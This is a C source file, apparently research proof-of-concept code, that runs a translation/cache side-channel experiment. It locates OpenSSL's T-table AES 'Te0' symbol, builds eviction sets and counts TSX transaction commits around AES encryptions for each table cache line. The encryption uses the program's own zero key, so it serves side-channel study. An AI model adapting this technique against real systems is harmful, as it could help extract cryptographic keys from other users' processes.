#include <ctype.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <openssl/aes.h>

#include <fcntl.h>
#include <sched.h>
#include <time.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>

#include <libelf.h>
#include <gelf.h>

#include <xlate/elf.h>
#include <xlate/eviction.h>
#include <xlate/list.h>
#include <xlate/macros.h>
#include <xlate/page_set.h>
#include <xlate/stats.h>
#include <xlate/tlb.h>

#include <xlate/x86-64/clflush.h>
#include <xlate/x86-64/time.h>
#include <xlate/x86-64/tsx.h>

struct page_set tlb_set;

void *crypto_find_te0(int fd)
{
	Elf *elf;
	void *base;

	elf_version(EV_CURRENT);

	elf = elf_begin(fd, ELF_C_READ, NULL);

	if (!(base = gelf_find_sym_ptr(elf, "Te0"))) {
		fprintf(stderr, "error: unable to find the 'Te0' symbol in "
			"libcrypto.so.\n\nPlease compile a version of OpenSSL with the "
			"T-table AES implementation enabled.\n");
		return NULL;
	}

	elf_end(elf);

	return base;
}

int cmp_size(const void *lhs, const void *rhs)
{
	return memcmp(lhs, rhs, sizeof(size_t));
}

int cmp_u64(const void *lhs, const void *rhs)
{
	return memcmp(lhs, rhs, sizeof(uint64_t));
}

char *alloc_huge_page(void)
{
	char *page, *offset;
	size_t size;

	if ((page = mmap(NULL, 4 * MIB, PROT_NONE,
		MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		return NULL;

	offset = (char *)ALIGN_UP((uintptr_t)page, 2 * MIB);

	size = (size_t)(offset - page);
	munmap(page, size);

	size = (size_t)(4 * MIB - (uintptr_t)offset - 2 * MIB);
	//munmap(offset + 2 * MIB, size);

	return offset;
}

char *alloc_page(int fd)
{
	char *page;

	if (!(page = alloc_huge_page()))
		return NULL;

	mmap(page, 4 * KIB, PROT_READ | PROT_WRITE,
		MAP_FIXED | MAP_SHARED, fd, 0);
	munmap(page + 4 * KIB, 2 * MIB - 4 * KIB);

	return page;
}

unsigned char key_data[32] = { 0 };

unsigned char plain[16];
unsigned char cipher[128];
unsigned char restored[128];

void seed(void)
{
	struct timeval tv;

	gettimeofday(&tv, NULL);
	srand48(tv.tv_usec);
}

int main(int argc, char *argv[])
{
	AES_KEY key;
	uint64_t *timings;
	struct stat stat;
	struct page_set lines, wset;
	int fd;
	char *base;
	char *te0;
	char *cl;
	size_t size;
	size_t round;
	size_t i, j;
	size_t byte;
	size_t nways = 16;
	unsigned ret;

	timings = malloc(1000000 * sizeof *timings);

	seed();

	if (argc < 2) {
		fprintf(stderr, "%s <path> [<nways>]\n", argv[0]);
		return -1;
	}

	if (argc >= 3) {
		nways = (size_t)strtoull(argv[2], NULL, 10);
	}

	if ((fd = open(argv[1], O_RDONLY)) < 0) {
		perror("open");
		return -1;
	}

	if (!(te0 = crypto_find_te0(fd)))
		return -1;

	if (fstat(fd, &stat) < 0) {
		fprintf(stderr, "error: unable to get the file size of libcrypto.so\n");
		return -1;
	}

	size = ALIGN_UP((size_t)stat.st_size, 4 * KIB);

	if ((base = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0)) == MAP_FAILED) {
		fprintf(stderr, "error: unable to map libcrypto.so\n");
		return -1;
	}

	close(fd);

	build_ptable_pool(&lines, "/foo", 4096);
	build_tlb(&tlb_set, "/foo", 1600);
	AES_set_encrypt_key(key_data, 128, &key);

	page_set_init(&wset, 16);

	for (cl = base + (size_t)te0, j = 0; j < 16; ++j, cl += 64) {
		page_set_remap(&lines, cl);
		find_wset(&lines, &wset, &tlb_set, cl, nways, xlate_and_probe);
		limit_wset(&lines, &wset, nways);

		struct timespec past, now;
		double diff;

		clock_gettime(CLOCK_MONOTONIC, &past);

		for (byte = 0; byte < 256; byte += 16) {
			plain[0] = byte;
			int64_t commits = 0;

			xlate(&wset, &tlb_set);

			for (round = 0; round < 1000000; ++round) {
				for (i = 1; i < 16; ++i) {
					plain[i] = rand() % 256;
				}

				for (i = 0; i < tlb_set.len; ++i)
					*(volatile char *)tlb_set.data[i];

				page_set_shuffle(&wset);

				if ((ret = xbegin()) == XBEGIN_INIT) {
					for (i = 0; i < wset.len; ++i)
						*(volatile char *)wset.data[i];

					AES_encrypt(plain, cipher, &key);
					xend();
					++commits;
				}
			}

			printf("%" PRId64 " ", commits);
			fflush(stdout);
		}

		clock_gettime(CLOCK_MONOTONIC, &now);

		diff = now.tv_sec + now.tv_nsec * .000000001;
		diff -= past.tv_sec + past.tv_nsec * .000000001;
		fprintf(stderr, "time: %.03lfs\n", diff);

		for (i = 0; i < wset.len; ++i) {
			page_set_push(&lines, wset.data[i]);
		}

		printf("\n");
	}

	close(fd);
	shm_unlink("/foo");

	return 0;
}
